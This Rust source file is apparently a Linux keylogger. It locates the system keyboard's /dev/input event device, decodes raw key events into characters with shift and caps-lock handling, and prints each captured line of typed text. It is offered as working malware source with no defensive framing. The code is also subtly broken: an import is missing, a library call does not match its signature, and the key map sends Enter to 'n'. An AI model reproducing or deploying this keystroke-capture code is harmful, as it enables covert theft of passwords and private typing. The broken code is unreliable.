use nix::fcntl::OFlag;
use nix::sys::stat::Mode;
use nix::unistd::{close, open, read};
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::mem;
use std::os::unix::io::RawFd;

const DEVICES: &str = "/proc/bus/input/devices";
const INPUTSTREAM: &str = "/dev/input/";
const BUFFER_SIZE: usize = 64;
const BUFFER_SOFT_CAP: usize = 25;
const BUFFER_GOAL: usize = 10;

const KEYMAP: [&str; 60] = [
    "", "", "1", "2", "3", "4", "5", "6", "7", "8", // 0-9
    "9", "0", "-", "=", "", "", "q", "w", "e", "r", // 10-19
    "t", "y", "u", "i", "o", "p", "[", "]", "n", "", // 20-29
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", // 30-39
    "'", "`", "", "", "z", "x", "c", "v", "b", "n", // 40-49
    "m", ",", ".", "/", "", "*", "[LEFT_ALT]", " ", "", "", // 50-59
];

const KEY_BACKSPACE: u16 = 14;
const KEY_ENTER: u16 = 28;
const KEY_LEFTSHIFT: u16 = 42;
const KEY_RIGHTSHIFT: u16 = 54;
const KEY_CAPSLOCK: u16 = 58;

#[repr(C)]
#[derive(Debug)]
struct InputEvent {
    time: libc::timeval,
    type_: u16,
    code: u16,
    value: i32,
}

fn get_event_file() -> Option<String> {
    let file = File::open(DEVICES).ok()?;
    let reader = BufReader::new(file);

    let mut event_file: Option<String> = None;
    let mut reached_keyboard = false;

    for line in reader.lines() {
        let line = line.ok()?;

        if line.contains("AT Translated Set 2 keyboard") {
            reached_keyboard = true;
        }

        if reached_keyboard && line.starts_with("H: Handlers=") {
            let tokens: Vec<&str> = line.split_whitespace().collect();
            for token in tokens {
                if token.starts_with("event") {
                    event_file = Some(token.to_string());
                    break;
                }
            }
            break;
        }
    }

    event_file
}

fn interpret_character(
    code: u16,
    value: i32,
    shift_pressed: &mut bool,
    caps_enabled: &mut bool,
) -> Option<char> {
    if value == 0 {
        // Key release event
        if code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT {
            *shift_pressed = false;
        }
        return None;
    } else if value == 1 || value == 2 {
        // Key press or autorepeat
        if code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT {
            *shift_pressed = true;
            return None;
        }

        if code == KEY_CAPSLOCK {
            *caps_enabled = !*caps_enabled;
            return None;
        }

        if code < KEYMAP.len() as u16 {
            let mut ch = KEYMAP[code as usize];
            if ch.is_empty() {
                return None;
            }

            if *shift_pressed || *caps_enabled {
                ch = &ch.to_uppercase();
            }

            return ch.chars().next();
        } else if code == KEY_ENTER {
            return Some('\n');
        } else if code == KEY_BACKSPACE {
            return Some('\x08'); // Backspace character
        }
    }

    None
}

fn main() {
    let event_file_name = match get_event_file() {
        Some(name) => name,
        None => {
            eprintln!("Failed to find keyboard event file.");
            return;
        }
    };

    let event_file_path = format!("{}{}", INPUTSTREAM, event_file_name);
    let fd = match open(event_file_path.as_str(), OFlag::O_RDONLY, Mode::empty()) {
        Ok(fd) => fd,
        Err(err) => {
            eprintln!("Failed to open {}: {}", event_file_path, err);
            return;
        }
    };

    let mut buffer: Vec<u8> = vec![0; mem::size_of::<InputEvent>()];
    let mut output_buffer = String::new();
    let mut shift_pressed = false;
    let mut caps_enabled = false;
    let mut line_counter = 0;

    loop {
        let res = unsafe {
            read(
                fd,
                buffer.as_mut_ptr() as *mut libc::c_void,
                mem::size_of::<InputEvent>(),
            )
        };
        if res <= 0 {
            eprintln!("Error reading input event.");
            break;
        }

        let input_event: InputEvent = unsafe { ptr::read(buffer.as_ptr() as *const _) };

        if input_event.type_ == 1 {
            // EV_KEY event
            if let Some(ch) = interpret_character(
                input_event.code,
                input_event.value,
                &mut shift_pressed,
                &mut caps_enabled,
            ) {
                if ch == '\n' {
                    line_counter += 1;
                    println!("Buffer: {}", output_buffer);
                    output_buffer.clear();

                    if line_counter >= BUFFER_GOAL {
                        break;
                    }
                } else if ch == '\x08' {
                    // Handle backspace
                    output_buffer.pop();
                } else {
                    output_buffer.push(ch);
                }
            }
        }
    }

    close(fd).ok();
}
